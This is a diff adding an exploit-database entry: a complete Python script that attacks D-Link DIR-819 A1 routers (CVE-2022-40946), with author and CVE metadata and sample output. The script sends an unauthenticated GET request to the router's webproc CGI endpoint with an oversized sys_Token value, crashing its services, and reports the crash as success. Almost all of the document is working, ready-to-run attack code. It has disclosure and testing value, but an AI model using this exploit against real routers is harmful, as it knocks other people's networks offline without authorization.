@@ -1,0 +1,117 @@
+id: 38301
+date: 03/27/2023
+title: D-Link DIR 819 A1 - Denial of Service Exploit
+author: whokilleddb
+cves: CVE-2022-40946
+
+# Exploit Title: DLink DIR 819 A1 - Denial of Service 
+# Date: 30th September, 2022
+# Exploit Author: @whokilleddb (https://twitter.com/whokilleddb)
+# Vendor Homepage: https://www.dlink.com/en/products/dir-819-wireless-ac750-dual-band-router
+# Version: DIR-819 (Firmware Version : 1.06 Hardware Version : A1)
+# Tested on: Firmware Version - 1.06 Hardware Version - A1
+# CVE : CVE-2022-40946
+#
+# Github: https://github.com/whokilleddb/dlink-dir-819-dos
+#
+# $ ./exploit.py -i 192.168.0.1                         
+# [+] DLink DIR-819 DoS exploit
+# [i] Address to attack: 192.168.0.1
+# [i] Using SSL:         False
+# [i] Request Timeout:   30s
+# [i] Buffer Length:     19
+# [i] Payload:           http://192.168.0.1/cgi-bin/webproc?getpage=html/index.html&errorpage=html/error.html&var:language=en_us&var:menu=basic&var:page=Bas_wansum&var:sys_Token=6307226200704307522
+# [+] Exploit Successful!
+
+#!/usr/bin/env python3
+import sys
+import string
+import urllib3
+import requests
+import argparse
+import random
+import socket
+from rich import print
+
+
+# Disable SSL Warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+# Globals
+TIMEOUT = 30
+#BUFFER_LEN = 19
+BUFFER_LEN = 32
+
+# Class to exploit
+class Exploit:
+    def __init__(self, ip, is_ssl):
+        """Initialize the constructor"""
+
+        self.ip = ip
+        self.is_ssl = is_ssl
+ 
+        _payload = f"{self.ip}/cgi-bin/webproc?getpage=html/index.html&errorpage=html/error.html&var:language=en_us&var:menu=basic&var:page=Bas_wansum&var:sys_Token={''.join(x for x in random.choices(string.digits, k=BUFFER_LEN))}"
+
+        if self.is_ssl:
+            self.payload = f"https://{_payload}"
+        else:
+            self.payload = f"http://{_payload}"
+
+
+    def show(self):
+        """Show the parameters"""
+
+        print(f"[bold][[cyan]i[/cyan]] Address to attack: [green]{self.ip}[/green][/bold]")
+        print(f"[bold][[cyan]i[/cyan]] Using SSL:         [green]{self.is_ssl}[/green][/bold]")
+        print(f"[bold][[cyan]i[/cyan]] Request Timeout:   [green]{TIMEOUT}s[/green][/bold]")
+        print(f"[bold][[cyan]i[/cyan]] Buffer Length:     [green]{BUFFER_LEN}[/green][/bold]")
+        print(f"[bold][[cyan]i[/cyan]] Payload:           [green]{self.payload}[/green][/bold]")
+
+
+    def run(self):
+        """Run the exploit"""
+        print(f"[bold][[magenta]+[/magenta]] DLink DIR-819 DoS exploit[/bold]")
+        self.show()
+
+        try:
+            r = requests.get(self.payload, verify=False, timeout=TIMEOUT)
+            if "Internal Error" in r.text:
+                print(f"[bold][[green]+[/green]] Exploit Successful![/bold]")
+                print(f"[bold][[green]+[/green]] Router services must be down![/bold]")
+            else:
+                print(f"[bold][[red]![/red]] Exploit Failed :([/bold]") 
+
+        except requests.exceptions.Timeout:
+            print(f"[bold][[green]+[/green]] Exploit Successful![/bold]")
+            
+        except Exception as e:
+            print(f"Error occured as: {e}")
+            
+
+def main():
+    """Main function to run"""
+
+    parser = argparse.ArgumentParser(
+        description="DLink DIR-819 Unauthenticated DoS")
+    parser.add_argument('-i', '--ip', required=True, help="IP of the router")
+    parser.add_argument('-s', '--ssl', required=False, action="store_true")
+
+    opts = parser.parse_args()
+    
+    try:
+        ip = socket.gethostbyname(opts.ip)
+    except socket.error:
+        print("[bold red][!] Invalid IP address[/bold red]", file=sys.stderr)
+        return
+
+    is_ssl = opts.ssl
+
+    exploit = Exploit(ip, is_ssl)
+    exploit.run()
+
+
+if __name__ == '__main__':
+    main()
+
+#  0day.today [2023-04-03]  #
